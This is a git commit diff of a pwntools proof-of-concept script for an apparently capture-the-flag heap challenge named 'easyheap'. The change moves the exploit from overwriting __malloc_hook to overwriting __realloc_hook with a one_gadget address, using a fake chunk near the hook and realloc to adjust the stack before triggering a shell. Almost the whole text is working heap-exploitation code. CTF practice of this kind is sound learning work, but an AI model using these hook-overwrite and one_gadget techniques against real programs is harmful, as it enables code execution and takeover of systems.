017ab59347d5e209c05099e345ae0a9944de3641
leo <hireedleo@gmail.com>
2020-10-24 22:58:19 +0800

    __realloc_hook, __malloc_hook and realloc

--- pwn/20201012_Zhuhai/easyheap/poc_easyheap.py
+++ pwn/20201012_Zhuhai/easyheap/poc_easyheap.py
@@ -65,8 +65,8 @@ def pwn():
 
 	off_arena = 0x3c4b20
 	libc_base = addr_arena - off_arena
-	one_gadget = libc_base + 0x45226
-	fake_chunk = libc_base + g_libc.symbols["__malloc_hook"] - 0x23
+	one_gadget = libc_base + 0x4527a # [rsp+0x30] == NULL  
+	fake_chunk = libc_base + g_libc.symbols["__realloc_hook"] - 0x1b
 
 	log.success("libc@%#x\none_gadget@%#x\nfake_chunk@%#x" % (libc_base, one_gadget, fake_chunk))
 	remove(1)	
@@ -81,14 +81,14 @@ def pwn():
 	
 	add(0x60, "eee") # 4
 
-	getpid()
-	
-	payload_hijack = flat(['a'*(0x23-0x10), one_gadget])
+	adjust_stack = libc_base + g_libc.symbols["realloc"]# + 0xc 
+	payload_hijack = flat(['a'*(0x1b-0x10), one_gadget, adjust_stack])
 	add(0x60, payload_hijack)
 
 	# trigger __malloc_hook
-	add(0x60, "getshell")
-
+	getpid()
+	opt(1)
+	g_io.sendlineafter("Input group size:", str(0x60))	
 if "__main__" == __name__:
 	pwn()
 	g_io.interactive()
